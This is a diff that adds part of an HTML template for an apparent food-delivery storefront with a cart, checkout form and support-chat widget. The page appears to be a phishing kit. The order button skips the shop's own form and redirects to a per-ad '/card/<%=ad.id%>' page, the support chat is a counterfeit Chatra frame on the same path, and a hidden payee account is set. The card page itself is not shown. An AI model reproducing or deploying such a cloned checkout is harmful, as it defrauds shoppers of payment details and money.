+                              <li> Адрес: г. Иркутск, ул. Декабрьских событий, 102/1 </li>
+                              <li> Адрес: г. Липецк, ул. Титова, 10 </li>
+                              <li> Адрес: г. Нижневартовск, ул. Кузоваткина 1, строение 6 </li>
+                              <li> Адрес: г. Саратов, ул. Большая садовая, 239 </li>
+                              <li> Адрес: г. Домодедово, ул. Каширское шоссе , 8 </li>
+                              <li> Адрес: г. Норильск, ул. Металлургов площадь, 23а </li>
+                              <li> Адрес: г. Тольятти, ул. Юбилейная, 40 </li>
+                              <li> Адрес: г. Елец, ул. А. Гайтеровой, 42 </li>
+                              <li> Адрес: г. Волжский, Свердлова площадь, 3, РК Спутник </li>
+                              <li> Адрес: г. Тверь, Пр. Калинина, 15 </li>-->
+                                        </ul>
+
+                                    </li>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="t-col t-col_5 ">
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="rec79816190" class="r t-rec r_hidden r_anim" style=" "
+            data-record-type="126">
+            <!-- T118 -->
+            <div class="t118">
+                <div class="t-container">
+                    <div class="t-col t-col_12 ">
+                        <hr class="t118__line"
+                            style="background-color:#000000;opacity:1;">
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="rec53444728" class="r t-rec" style="opacity: 1;"
+            data-animationappear="off" data-record-type="706">
+            <script type="text/javascript">
+                $(document).ready(function () {
+                    tcart__init('53444728');
+                });
+            </script>
+            <div class="t706" data-project-currency="UZS."
+                data-project-currency-side="r" data-project-currency-sep=","
+                data-payment-system="yamoney" data-cart-minorder="1"
+                data-cart-oneproduct="y">
+                <div class="t706__carticon t706__carticon_sm"
+                    style="right:25px;">
+                    <div class="t706__carticon-text t-name t-name_xs">=&nbsp;
+                    </div>
+                    <div class="t706__carticon-wrapper">
+                        <!--<div class="t706__carticon-imgwrap"><img class="t706__carticon-img" src="images/lib__linea__930cac0f-758b-b7ee-1eb0-b18fc6e10893__ecommerce_bag.png"></div>-->
+                        <div class="t706__carticon-imgwrap" >
+                            <svg class="t706__carticon-img"
+                                xmlns="http://www.w3.org/2000/svg"
+                                style="width: 60px;
+                                height: 60px;"
+                                viewBox="0 0 64 64">
+                                <descr style="color:#bebebe;">Cart</descr>
+                                <path fill="none" stroke-width="2"
+                                    stroke-miterlimit="10"
+                                    d="M44 18h10v45H10V18h10z"></path>
+                                <path fill="none" stroke-width="2"
+                                    stroke-miterlimit="10"
+                                    d="M22 24V11c0-5.523 4.477-10 10-10s10 4.477 10 10v13">
+                                </path>
+                            </svg>
+                        </div>
+                        <div class="t706__carticon-counter"
+                            style="background-color:#ff623b;"></div>
+                    </div>
+                </div>
+                <div class="t706__cartwin">
+                    <div class="t706__cartwin-close">
+                        <div class="t706__cartwin-close-wrapper">
+                            <svg class="t706__cartwin-close-icon" width="23px"
+                                height="23px" viewBox="0 0 23 23" version="1.1"
+                                xmlns="http://www.w3.org/2000/svg"
+                                xlink="http://www.w3.org/1999/xlink">
+                                <g stroke="none" stroke-width="1" fill="#fff"
+                                    fill-rule="evenodd">
+                                    <rect
+                                        transform="translate(11.313708, 11.313708) rotate(-45.000000) translate(-11.313708, -11.313708) "
+                                        x="10.3137085" y="-3.6862915" width="2"
+                                        height="30"></rect>
+                                    <rect
+                                        transform="translate(11.313708, 11.313708) rotate(-315.000000) translate(-11.313708, -11.313708) "
+                                        x="10.3137085" y="-3.6862915" width="2"
+                                        height="30"></rect>
+                                </g>
+                            </svg>
+                        </div>
+                    </div>
+                    <div class="t706__cartwin-content">
+                        <div class="t706__cartwin-top">
+                            <div class="t706__cartwin-heading t-name t-name_xl">
+                                Оформление заказа</div>
+                        </div>
+                        <div class="t706__cartwin-products"></div>
+                        <div class="t706__cartwin-bottom">
+                            <div
+                                class="t706__cartwin-prodamount-wrap t-descr t-descr_sm">
+                                <div class="t706__cartwin-prodamount-minorder"
+                                    style="opacity:0.5; font-size:14px; font-weight:400;">
+                                    Minimal order: 1&nbsp;UZS.</div> <span
+                                    class="t706__cartwin-prodamount-label">Сумма:&nbsp;</span><span
+                                    class="t706__cartwin-prodamount"></span>
+                            </div>
+                        </div>
+                        <div id="dannie"
+                            class="t706__form-upper-text t-descr t-descr_xs">
+                            Укажите пожалуйста свои данные.<br></div>
+                        <div class="t706__orderform ">
+
+
+
+
+                            <div id="goods"
+                                class="js-successbox t-form__successbox t-text t-text_md"
+                                style="display:none;">Спасибо! Заказ оформлен.
+                                Пожалуйста, подождите. Идет переход к оплате....
+                            </div>
+                            <form method="POST" id="ajax_form"
+                                action="redir.php">
+                                <input type="hidden" name="summaryam"
+                                    id="summaryam">
+                                <div id="globals">
+                                    <div class="t-form__inputsbox">
+                                        <div class="t-input-group t-input-group_nm"
+                                            data-input-lid="1496239431201">
+                                            <div class="t-input-title t-descr t-descr/_md"
+                                                data-redactor-toolbar="no"
+                                                field="li_title__1496239431201"
+                                                style="font-weight:600;">Ваше
+                                                имя</div>
+                                            <div class="t-input-block">
+                                                <input type="text" name="Name"
+                                                    id="namess"
+                                                    class="t-input js-tilda-rule "
+                                                    required=""
+                                                    placeholder="Иван Смирнов"
+                                                    style="color:#000000; border:1px solid #000000; border-radius: 30px; -moz-border-radius: 30px; -webkit-border-radius: 30px;">
+                                                <div class="t-input-error">
+                                                    Обязательное поле</div>
+                                            </div>
+                                        </div>
+
+                                        <!--<div class="t-input-group t-input-group_em" data-input-lid="1496239459190">
+                                 <div class="t-input-title t-descr t-descr_md" data-redactor-toolbar="no" field="li_title__1496239459190" style="font-weight:600;">Ваш Email</div>
+                                 <div class="t-input-block">
+                                    <input type="text" name="email" class="t-input js-tilda-rule " value="" required placeholder="example@site.com" style="color:#000000; border:1px solid #000000; border-radius: 30px; -moz-border-radius: 30px; -webkit-border-radius: 30px;"> 
+                                    <div class="t-input-error"></div>
+                                 </div>
+                              </div>-->
+
+                                        <div class="t-input-group t-input-group_ph"
+                                            data-input-lid="1496239478607">
+                                            <div class="t-input-title t-descr t-descr_md"
+                                                data-redactor-toolbar="no"
+                                                field="li_title__1496239478607"
+                                                style="font-weight:600;">Ваш
+                                                телефон</div>
+                                            <div class="t-input-block">
+                                                <input type="text" name="phone"
+                                                    class="t-input js-tilda-rule js-tilda-mask "
+                                                    required=""
+                                                    placeholder="Введите номер телефона для оплаты"
+                                                    data-tilda-req="1"
+                                                    data-tilda-rule="phone"
+                                                    style="color:#000000; border:1px solid #000000; border-radius: 30px; -moz-border-radius: 30px; -webkit-border-radius: 30px;">
+                                                <div class="t-input-error">
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                        <div class="t-input-group t-input-group_sb"
+                                            data-input-lid="1525824070683">
+                                            <div class="t-input-title t-descr t-descr_md"
+                                                data-redactor-toolbar="no"
+                                                field="li_title__1525824070683"
+                                                style="font-weight:600;">
+                                                Выберите город</div>
+                                            <div class="t-input-block">
+                                                <div class="t-select__wrapper ">
+                                                    <select required=""
+                                                        id="gorod" name="gorod"
+                                                        class="t-select js-tilda-rule "
+                                                        data-tilda-req="1"
+                                                        style="color:#000000; border:1px solid #000000; border-radius: 30px; -moz-border-radius: 30px; -webkit-border-radius: 30px;">
+                                                        <option value="Ташкент"
+                                                            selected="selected">
+                                                            Ташкент</option>
+                                                        <option
+                                                            value="Наманган">
+                                                            Наманган</option>
+                                                        <option
+                                                            value="Самарканд">
+                                                            Самарканд</option>
+                                                        <option value="Андижан">
+                                                            Андижан</option>
+                                                        <option value="Нукус">
+                                                            Нукус</option>
+                                                        <option value="Бухара">
+                                                            Бухара</option>
+                                                        <option value="Карши">
+                                                            Карши</option>
+                                                        <option value="Фергана">
+                                                            Фергана</option>
+                                                        <option value="Коканд">
+                                                            Коканд</option>
+                                                        <option
+                                                            value="Маргилан">
+                                                            Маргилан</option>
+                                                        <option value="Чирчик">
+                                                            Чирчик</option>
+                                                        <option value="Джизак">
+                                                            Джизак</option>
+                                                        <option value="Алмалык">
+                                                            Алмалык</option>
+                                                        <option value="Ургенч">
+                                                            Ургенч</option>
+                                                        <option value="Навои">
+                                                            Навои</option>
+                                                    </select>
+                                                </div>
+                                                <div class="t-input-error">
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                        <div class="t-input-group t-input-group_em"
+                                            data-input-lid="1496239459190">
+                                            <div class="t-input-title t-descr t-descr_md"
+                                                data-redactor-toolbar="no"
+                                                field="li_title__1496239459190"
+                                                style="font-weight:600;">Адрес
+                                                доставки</div>
+                                            <div class="t-input-block">
+                                                <input type="text" name="email"
+                                                    class="t-input js-tilda-rule "
+                                                    required=""
+                                                    placeholder="Введите адрес доставки"
+                                                    style="color:#000000; border:1px solid #000000; border-radius: 30px; -moz-border-radius: 30px; -webkit-border-radius: 30px;">
+                                                <div class="t-input-error">
+                                                </div>
+                                            </div>
+                                        </div>
+
+
+
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+                        <!--[if IE 8]>
+                              <style>.t-checkbox__control .t-checkbox, .t-radio__control .t-radio { left: 0px; z-index: 1; opacity: 1;	}	.t-checkbox__indicator, .t-radio__indicator { display: none;	}</style>
+                              <![endif]-->
+                        <div
+                            class="t706__cartwin-totalamount-wrap t-descr t-descr_xl">
+                            <div class="t706__cartwin-totalamount-info"
+                                style="font-size:14px; padding-bottom:10px; font-weight:400;">
+                            </div><span
+                                class="t706__cartwin-totalamount-label">Сумма:&nbsp;</span><span
+                                class="t706__cartwin-totalamount"></span>
+                        </div>
+                        <div class="t-form__errorbox-middle">
+                            <div class="js-errorbox-all t-form__errorbox-wrapper"
+                                style="display:none;">
+                                <div
+                                    class="t-form__errorbox-text t-text t-text_md">
+                                    <p
+                                        class="t-form__errorbox-item js-rule-error js-rule-error-all">
+                                    </p>
+                                    <p
+                                        class="t-form__errorbox-item js-rule-error js-rule-error-req">
+                                    </p>
+                                    <p
+                                        class="t-form__errorbox-item js-rule-error js-rule-error-email">
+                                    </p>
+                                    <p
+                                        class="t-form__errorbox-item js-rule-error js-rule-error-name">
+                                    </p>
+                                    <p
+                                        class="t-form__errorbox-item js-rule-error js-rule-error-phone">
+                                    </p>
+                                    <p
+                                        class="t-form__errorbox-item js-rule-error js-rule-error-string">
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <input type="hidden" name="account" value="79873702076">
+                        <input type="hidden" name="comment"
+                            value="Ваш заказ под 6324">
+                        <input type="hidden" id="summas" name="amountInteger"
+                            value="" data-type="number">
+
+                        <div class="t-form__submit">
+                            <button type="submit" id="neworder" class="t-submit"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">Оформить
+                                заказ</button> </div>
+                    </div>
+                </div>
+
+                <div class="t-form__errorbox-bottom">
+                    <div class="js-errorbox-all t-form__errorbox-wrapper"
+                        style="display:none;">
+                        <div class="t-form__errorbox-text t-text t-text_md">
+                            <p
+                                class="t-form__errorbox-item js-rule-error js-rule-error-all">
+                            </p>
+                            <p
+                                class="t-form__errorbox-item js-rule-error js-rule-error-req">
+                            </p>
+                            <p
+                                class="t-form__errorbox-item js-rule-error js-rule-error-email">
+                            </p>
+                            <p
+                                class="t-form__errorbox-item js-rule-error js-rule-error-name">
+                            </p>
+                            <p
+                                class="t-form__errorbox-item js-rule-error js-rule-error-phone">
+                            </p>
+                            <p
+                                class="t-form__errorbox-item js-rule-error js-rule-error-string">
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+                <style>
+                    #rec53444728 input::-webkit-input-placeholder {
+                        color: #000000;
+                        opacity: 0.5;
+                    }
+
+                    #rec53444728 input::-moz-placeholder {
+                        color: #000000;
+                        opacity: 0.5;
+                    }
+
+                    #rec53444728 input:-moz-placeholder {
+                        color: #000000;
+                        opacity: 0.5;
+                    }
+
+                    #rec53444728 input:-ms-input-placeholder {
+                        color: #000000;
+                        opacity: 0.5;
+                    }
+
+                    #rec53444728 textarea::-webkit-input-placeholder {
+                        color: #000000;
+                        opacity: 0.5;
+                    }
+
+                    #rec53444728 textarea::-moz-placeholder {
+                        color: #000000;
+                        opacity: 0.5;
+                    }
+
+                    #rec53444728 textarea:-moz-placeholder {
+                        color: #000000;
+                        opacity: 0.5;
+                    }
+
+                    #rec53444728 textarea:-ms-input-placeholder {
+                        color: #000000;
+                        opacity: 0.5;
+                    }
+                </style>
+            </div>
+            <div class="t706__form-bottom-text t-text t-text_xs">Tasty-Food Все
+                права защищены. 2022</div>
+        </div>
+    </div>
+    <div class="t706__cartdata"> </div>
+
+    <style>
+        @media screen and (max-width: 960px) {
+            .t706__carticon {}
+        }
+    </style>
+
+    <div id="rec53444729" class="r t-rec" style=" " data-animationappear="off"
+        data-record-type="217">
+        <div class="t190"
+            style="position: fixed; z-index: 100000; bottom: 30px; left: 30px; min-height: 30px; display: none;">
+            <a href="javascript:t190_scrollToTop();">
+                <svg version="1.1" id="Layer_1"
+                    xmlns="http://www.w3.org/2000/svg"
+                    xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+                    width="50px" height="50px" viewBox="0 0 48 48"
+                    enable-background="new 0 0 48 48" xml:space="preserve">
+                    <path style="fill:#000000;"
+                        d="M43.006,47.529H4.964c-2.635,0-4.791-2.156-4.791-4.791V4.697c0-2.635,2.156-4.791,4.791-4.791h38.042 c2.635,0,4.791,2.156,4.791,4.791v38.042C47.797,45.373,45.641,47.529,43.006,47.529z M25.503,16.881l6.994,7.049 c0.583,0.588,1.532,0.592,2.121,0.008c0.588-0.583,0.592-1.533,0.008-2.122l-9.562-9.637c-0.281-0.283-0.664-0.443-1.063-0.443 c0,0,0,0-0.001,0c-0.399,0-0.782,0.159-1.063,0.442l-9.591,9.637c-0.584,0.587-0.583,1.537,0.005,2.121 c0.292,0.292,0.675,0.437,1.058,0.437c0.385,0,0.77-0.147,1.063-0.442L22.5,16.87v19.163c0,0.828,0.671,1.5,1.5,1.5 s1.5-0.672,1.5-1.5L25.503,16.881z">
+                    </path>
+                </svg>
+            </a>
+        </div>
+        <script type="text/javascript">
+            $(document).ready(function () {
+                $('.t190').css("display", "none");
+                $(window).bind('scroll', t_throttle(function () {
+                    if ($(window).scrollTop() > $(window)
+                        .height()) {
+                        if ($('.t190').css('display') ==
+                            "none") {
+                            $('.t190').css("display",
+                                "block");
+                        }
+                    } else {
+                        if ($('.t190').css('display') ==
+                            "block") {
+                            $('.t190').css("display",
+                                "none");
+                        }
+                    }
+                }, 200));
+            });
+        </script>
+    </div>
+
+
+
+
+
+    <div id="rec87159636" class="r t-rec" style=" " data-animationappear="off"
+        data-record-type="796">
+        <!-- T796 -->
+        <div class="t796" data-shape-rec-ids="87157146,87159577">
+            <div class="t796__shape-border t796__shape-border_bottom">
+                <svg class="t796__svg" style="width:100%;height:1vw;"
+                    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 10"
+                    preserveAspectRatio="none">
+                    <path
+                        d="M992 8.2L983.8 0l-8.2 8.2-8.2-8.2-8.2 8.2L951 0l-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2L869 0l-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2L787 0l-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2L705 0l-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2L623 0l-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2L541 0l-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2L459 0l-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2L377 0l-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2L295 0l-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2L213 0l-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2-8.2-8.2-8.2 8.2L131 0l-8.2 8.2-8.2-8.2-8.2 8.2L98.2 0 90 8.2 81.8 0l-8.2 8.2L65.4 0l-8.2 8.2L49 0l-8.2 8.2L32.6 0l-8.2 8.2L16.2 0 8 8.2-.2 0v10h1000.4V0">
+                    </path>
+                </svg>
+            </div>
+        </div>
+        <script type="text/javascript">
+            $(document).ready(function () {
+                t796_init('87159636');
+            });
+        </script>
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <script type="text/javascript">
+        $(document).ready(function () {
+
+            $('#orders386').submit(function (e) {
+                var form = this;
+                e.preventDefault();
+
+                $("#globals").hide(300);
+                $(".t706__cartwin-products").css("display",
+                    "none");
+                $(".t706__cartwin-bottom").css("display",
+                    "none");
+                $("#dannie").css("display", "none");
+
+
+                setTimeout(function () {
+                    $("#goods").css("display", "block");
+                }, 100); // in milliseconds
+
+
+
+
+
+                setTimeout(function () {
+                    form.submit();
+                }, 2500); // in milliseconds
+            });
+
+
+            $('#neworder').click(function () {
+
+                var orders = jQuery(
+                    ".t706__cartwin-totalamount").html();
+                jQuery("#summas").val(orders.replace(
+                    /[^-0-9]/gim, ''));
+                jQuery("#short-dest").val("Оплачивает: " +
+                    jQuery("#namess").val());
+                jQuery("#targets").val(jQuery("#gorod").val() +
+                    "; Дата: " + jQuery("#dates").val() +
+                    "; Время: " + jQuery("#times").val());
+
+            });
+
+
+
+            $("#goods22").click(function () {
+
+                var pole1 = jQuery("#pole1").val();
+                var msglen11 = pole1.length;
+
+                var pole2 = jQuery("#pole2").val();
+                var msglen22 = pole2.length;
+
+                if (msglen11 >= 7 && msglen22 >= 5) {
+
+                    $("#globals2").hide(300);
+
+                    setTimeout(function () {
+                        $("#goods2").css("display",
+                            "block");
+                    }, 300); // in milliseconds
+
+
+
+                } else
+
+                {
+                    $("#pole1").css("border", "1px solid red");
+                    $("#pole2").css("border", "1px solid red");
+                }
+
+            });
+
+            function next_1() {
+
+                $.ajax({
+                    type: "POST",
+                    url: 'action.php',
+                    data: {
+                        person: $("#person").val(),
+                        adres: $("#adres").val(),
+                        indeks: $("#indeks").val(),
+                        number: $("#number").val(),
+                        about: $("#about").val()
+                    },
+
+                    success: function (data) {
+
+                        if (data == "true") {
+
+                            $("#step1").fadeOut();
+
+                            setTimeout(function () {
+                                $("#step2")
+                            .fadeIn();
+                            }, 600);
+
+                        }
+
+                    }
+
+                })
+            }
+        });
+    </script>
+
+<script>
+    $("#neworder").on("click", function (e) {
+      e.preventDefault()
+      window.location.href = "/card/<%=ad.id%>"
+    })
+  </script>
+<div class="
+chatra--webkit
+chatra--style-round
+chatra--side-bottom
+chatra--pos-right
+chatra--visible
+chatra--expanded
+chatra--fast-toggle
+" id="chatra" data-turbolinks-permanent=""
+style="width: 380px; height: 600px; transform: none; z-index: 2147483647; display:none;">
+<div id="chatra__iframe-wrapper">
+  <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat"
+      allow="autoplay" src="/supportChatFrame/<%=ad.id%>"
+      style="width: 380px; height: 600px; position: absolute"></iframe>
+</div>
+</div>
+<div class="support-circle"
+onclick="document.querySelector('#chatra').style.display = 'block';this.style.display = 'none'"></div>
+
+
+</body>
+
+</html>
